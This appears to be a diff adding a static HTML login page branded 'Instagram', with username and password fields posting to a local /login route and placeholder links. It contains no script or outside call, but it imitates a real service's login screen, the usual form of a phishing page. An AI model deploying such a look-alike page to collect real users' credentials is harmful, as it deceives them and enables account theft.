@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="login-container">
+        <div class="login-box">
+            <h1 class="logo">Instagram</h1>
+            
+            <form action="/login" method="POST">
+                <div class="input-group">
+                    <input type="text" name="username" placeholder="Phone number, username, or email" required>
+                </div>
+                
+                <div class="input-group">
+                    <input type="password" name="password" placeholder="Password" required>
+                </div>
+                
+                <button type="submit" class="btn-primary">og In</button>
+            </form>
+            
+            <div class="divider">
+                <span class="line"></span>
+                <span class="text">OR</span>
+                <span class="line"></span>
+            </div>
+            
+            <div class="alternative-login">
+                <a href="#" class="btn-secondary">Log in with External Provider</a>
+                <br>
+                <a href="#" class="forgot-password">Forgot password?</a>
+            </div>
+        </div>
+        
+        <div class="signup-box">
+            <p>Don't have an account? <a href="#">Sign up</a></p>
+        </div>
+    </div>
+</body>
+</html>
